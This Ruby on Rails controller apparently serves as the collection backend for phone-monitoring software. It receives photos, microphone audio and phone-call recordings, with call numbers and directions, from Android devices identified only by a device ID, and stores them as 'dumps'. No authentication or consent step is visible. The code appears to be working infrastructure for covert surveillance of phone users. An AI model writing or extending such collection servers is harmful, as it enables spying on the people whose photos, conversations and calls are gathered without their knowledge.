module Api
  class MediaController < Api::BaseController
    def upload_photo
      device_id = InputValidator.sanitize_device_id(params[:device_id] || request.headers['X-Device-ID'])
      return render json: { error: 'Invalid or missing device_id' }, status: :bad_request if device_id.blank?
      
      smartphone = find_or_create_smartphone(device_id)
      
      if params[:file].present?
        # Validate file extension strictly
        ext = File.extname(params[:file].original_filename).downcase
        allowed_extensions = ['.jpg', '.jpeg', '.png']
        ext = '.jpg' unless allowed_extensions.include?(ext)
        
        # Validate MIME type for security
        content_type = params[:file].content_type.to_s.downcase
        allowed_mimes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/bmp', 'image/webp']
        unless allowed_mimes.include?(content_type)
          Rails.logger.warn("[MediaController] Rejected photo upload with invalid MIME: #{content_type}")
          return render json: { error: 'Invalid file type' }, status: :unprocessable_entity
        end

        return unless reject_oversize!(params[:file].size, 'photo upload')
        
        filename = "photo_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}#{ext}"
        filepath = secure_filepath('files/dumps/photos', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(params[:file].read) }
        
        smartphone.pictures.create!(
          filename: filename,
          date: Date.today
        )
      elsif params[:data].present? || params[:photo].present?
        # Base64 encoded image - Android sends as 'photo' key
        base64_data = params[:data] || params[:photo]
        decoded = Base64.decode64(base64_data)
        return unless reject_oversize!(decoded.bytesize, 'photo upload')
        filename = "photo_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}.jpg"
        filepath = secure_filepath('files/dumps/photos', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(decoded) }
        
        smartphone.pictures.create!(
          filename: filename,
          date: Date.today
        )
      else
        return render json: { error: 'No photo data provided' }, status: :bad_request
      end
      
      render json: { status: 'success', message: 'Photo saved' }, status: :ok
    rescue StandardError => e
      Rails.logger.error("Photo Upload Error: #{e.message}")
      render json: { error: e.message }, status: :unprocessable_entity
    end

    def upload_audio
      device_id = params[:device_id] || request.headers['X-Device-ID']
      return render json: { error: 'Missing device_id' }, status: :bad_request if device_id.blank?
      
      smartphone = find_or_create_smartphone(device_id)
      recording_type = params[:recording_type] || 'audio'
      
      if params[:file].present?
        # Validate file extension
        ext = File.extname(params[:file].original_filename).downcase rescue '.mp3'
        allowed_extensions = ['.mp3', '.wav', '.ogg', '.m4a', '.aac', '.flac', '.pcm', '.raw', '.3gp']
        ext = '.mp3' unless allowed_extensions.include?(ext)
        
        # Validate MIME type for security
        content_type = params[:file].content_type.to_s.downcase
        allowed_mimes = ['audio/mpeg', 'audio/mp3', 'audio/wav', 'audio/ogg', 'audio/mp4', 'audio/aac',
                         'audio/flac', 'audio/x-m4a', 'audio/raw', 'audio/pcm', 'audio/3gpp',
                         'application/octet-stream']
        unless allowed_mimes.include?(content_type)
          Rails.logger.warn("[MediaController] Rejected audio upload with invalid MIME: #{content_type}")
          return render json: { error: 'Invalid file type' }, status: :unprocessable_entity
        end

        return unless reject_oversize!(params[:file].size, 'audio upload')
        
        prefix = recording_type == 'call' ? 'call' : 'audio'
        filename = "#{prefix}_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}#{ext}"
        filepath = secure_filepath('files/dumps/audio', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(params[:file].read) }
        
        smartphone.recordings.create!(
          filename: filename,
          date: Date.today,
          duration: params[:duration] || 'unknown',
          recording_type: recording_type,
          call_number: params[:call_number],
          call_direction: params[:call_direction],
          strategy: params[:strategy]
        )
      elsif params[:data].present? || params[:audio].present?
        # Base64 encoded audio
        base64_data = params[:data] || params[:audio]
        decoded = Base64.decode64(base64_data)
        return unless reject_oversize!(decoded.bytesize, 'audio upload')
        prefix = recording_type == 'call' ? 'call' : 'audio'
        filename = "#{prefix}_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}.mp3"
        filepath = secure_filepath('files/dumps/audio', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(decoded) }
        
        smartphone.recordings.create!(
          filename: filename,
          date: Date.today,
          duration: params[:duration] || 'unknown',
          recording_type: recording_type,
          call_number: params[:call_number],
          call_direction: params[:call_direction],
          strategy: params[:strategy]
        )
      else
        return render json: { error: 'No audio data provided' }, status: :bad_request
      end
      
      render json: { status: 'success', message: 'Audio saved' }, status: :ok
    rescue StandardError => e
      Rails.logger.error("Audio Upload Error: #{e.message}")
      render json: { error: e.message }, status: :unprocessable_entity
    end
    
  end
end
